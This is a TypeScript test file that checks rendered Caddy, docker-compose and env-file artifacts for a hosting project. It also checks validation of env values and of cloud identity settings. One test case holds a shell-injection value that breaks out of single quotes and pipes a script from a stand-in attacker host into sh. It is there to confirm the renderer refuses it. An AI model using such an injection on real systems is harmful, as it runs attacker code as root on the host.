import { describe, expect, test } from "vitest";
import { parse } from "yaml";
import {
	CADDY_IMAGE,
	COMPOSERY_VOLUME_NAMES,
	renderComposeryEnv,
	renderRuntimeArtifacts
} from "@/convex/boxes/infra/artifacts";

describe("runtime artifacts", () => {
	test("renders Caddy, compose, and env with the plan's runtime contract", () => {
		const artifacts = renderRuntimeArtifacts({
			cloudBoxId: "box_123",
			cloudOrigin: "https://www.composery.io",
			domain: "my-box.composery.cloud",
			runtimeAuthHash: "$argon2id$v=19$m=1,t=1,p=1$salt$hash",
			runtimeImage: "ghcr.io/sloikodavid/composery@sha256:abc",
			runtimePort: 8080
		});

		expect(artifacts.caddyfile).toBe(
			"my-box.composery.cloud {\n\tencode gzip\n\treverse_proxy 127.0.0.1:8080\n}\n"
		);
		const compose = parse(artifacts.compose);
		expect(compose.services.caddy).toMatchObject({
			depends_on: { composery: { condition: "service_healthy" } },
			image: CADDY_IMAGE,
			logging: { driver: "local" },
			// Nothing is published: on the host's own network stack a bind is
			// already on the interface, so a published port would be a second
			// mapping of something already mapped.
			network_mode: "host",
			restart: "always"
		});
		expect(compose.services.composery).toMatchObject({
			env_file: "./composery.env",
			// COMPOSERY_BIND is what stops the editor's own port being published
			// along with everything else an owner binds. Without it the editor
			// would answer on the public interface and the firewall would be the
			// only thing between it and the internet.
			environment: [
				"COMPOSERY_BIND=127.0.0.1",
				"COMPOSERY_PERSISTENCE=overlay",
				"PORT=8080"
			],
			image: "ghcr.io/sloikodavid/composery@sha256:abc",
			init: true,
			logging: { driver: "local" },
			network_mode: "host",
			privileged: true,
			restart: "always",
			stop_grace_period: "1m",
			volumes: ["composery_data:/data"]
		});
		// A published or exposed port would mean the bridge is still in play.
		expect(compose.services.caddy.ports).toBeUndefined();
		expect(compose.services.composery.expose).toBeUndefined();
		expect(Object.keys(compose.volumes)).toEqual([...COMPOSERY_VOLUME_NAMES]);
		for (const name of COMPOSERY_VOLUME_NAMES) {
			expect(compose.volumes[name]).toEqual({ name });
		}
		expect(artifacts.env.trim().split("\n")).toEqual([
			"COMPOSERY_HASHED_PASSWORD='$argon2id$v=19$m=1,t=1,p=1$salt$hash'",
			"COMPOSERY_CLOUD_BOX_ID='box_123'",
			"COMPOSERY_CLOUD_ORIGIN='https://www.composery.io'",
			"COMPOSERY_RUNTIME_IMAGE='ghcr.io/sloikodavid/composery@sha256:abc'"
		]);
	});

	test("renders a locked cloud runtime without a bootstrap password", () => {
		const artifacts = renderRuntimeArtifacts({
			cloudBoxId: "box_123",
			cloudOrigin: "https://www.composery.io",
			domain: "my-box.composery.cloud",
			runtimeImage: "ghcr.io/sloikodavid/composery@sha256:abc",
			runtimePort: 8080
		});

		expect(artifacts.env).not.toContain("HASHED_PASSWORD");
		expect(artifacts.env).toContain("COMPOSERY_CLOUD_BOX_ID='box_123'");
	});
});

// The env file is written into a shell script, and a box's own configuration is
// a value its owner controls. Every value is wrapped in single quotes, so a
// value that could close that quote is the difference between a setting and a
// command running as root on the host.
describe("values that would break out of the env file", () => {
	const render = (value: string) =>
		renderComposeryEnv({ config: { COMPOSERY_TEST: value } });

	test.each([
		["a single quote", "'; curl evil.example | sh; '"],
		["a newline", "one\ntwo"],
		["a carriage return", "one\rtwo"]
	])("refuses a value containing %s", (_name, value) => {
		expect(() => render(value)).toThrow(
			"Env file values must be single-line shell values."
		);
	});

	test("quotes an ordinary value rather than refusing it", () => {
		expect(render("1")).toContain("COMPOSERY_TEST='1'");
	});

	// Spaces, equals signs and double quotes are ordinary inside single quotes,
	// and refusing them would refuse legitimate settings.
	test("allows what single quotes already make safe", () => {
		expect(render('a b="c"')).toContain(`COMPOSERY_TEST='a b="c"'`);
	});
});

// The cloud identity is a pair: a box id with no origin to send it to, or an
// origin with no box to name, would render a host that calls home as nobody.
describe("the cloud identity a box is given", () => {
	test.each([
		["an id with no origin", { cloudBoxId: "box123" }],
		["an origin with no id", { cloudOrigin: "https://composery.test" }]
	])("refuses %s", (_name, args) => {
		expect(() => renderComposeryEnv(args)).toThrow(
			"Cloud box id and origin must be configured together."
		);
	});

	test("renders both when both are given", () => {
		const env = renderComposeryEnv({
			cloudBoxId: "box123",
			cloudOrigin: "https://composery.test"
		});

		expect(env).toContain("COMPOSERY_CLOUD_BOX_ID='box123'");
		expect(env).toContain("COMPOSERY_CLOUD_ORIGIN='https://composery.test'");
	});

	// A self-hosted box has neither, which is not an error - it is every box
	// outside Composery Cloud.
	test("renders neither when neither is given", () => {
		const env = renderComposeryEnv({});

		expect(env).not.toContain("COMPOSERY_CLOUD_BOX_ID");
		expect(env).not.toContain("COMPOSERY_CLOUD_ORIGIN");
	});
});
